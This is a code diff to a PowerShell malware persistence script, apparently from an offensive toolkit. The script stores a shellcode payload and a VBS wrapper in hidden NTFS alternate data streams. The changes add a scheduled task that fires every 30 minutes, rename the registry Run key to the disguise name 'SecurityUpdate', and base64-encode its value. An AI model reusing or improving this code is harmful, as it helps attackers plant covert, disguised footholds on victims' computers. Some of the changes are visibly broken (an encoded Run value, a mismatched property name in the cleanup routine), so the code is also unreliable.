@@ -75,14 +75,20 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     #Create Alternate Data Streams for Payload and Wrapper
     $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
     $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
+    $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN SecurityUpdate /TR $env:USERPROFILE\AppData:$vbsFile"}
     Invoke-Command -ScriptBlock $CreatePayloadADS
     "Payload stored in $env:USERPROFILE\AppData:$textFile"
     Invoke-Command -ScriptBlock $CreateWrapperADS
     "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"
-
+    Invoke-Command -ScriptBlock $CreateScheduleADS
+    "Schedule payload is triggered on every 30 minutes"
+    
+    #Encode Reg path
+    $Regeditpayload = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
+    $encodedRegeditPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Regeditpayload))
     #Persist in Registry
-    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
-    "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
+    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SecurityUpdate -PropertyType String -Value $encodedRegeditPayload -Force
+    "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate"
 }
 
 
@@ -155,7 +161,7 @@ removing the registry key.
 #>
 
     # get the VBS trigger command/file location from the registry
-    $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update
+    $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run SecurityUpdate).Update
     $vbsFile = $trigger.split(" ")[1]
     $getWrapperADS = {cmd /C "more <  $vbsFile"}
     $wrapper = Invoke-Command -ScriptBlock $getWrapperADS
@@ -184,6 +190,6 @@ removing the registry key.
     }
 
     # remove the registry run key
-    Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update;
-    "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'Update' key"
+    Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name SecurityUpdate;
+    "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'SecurityUpdate' key"
 }
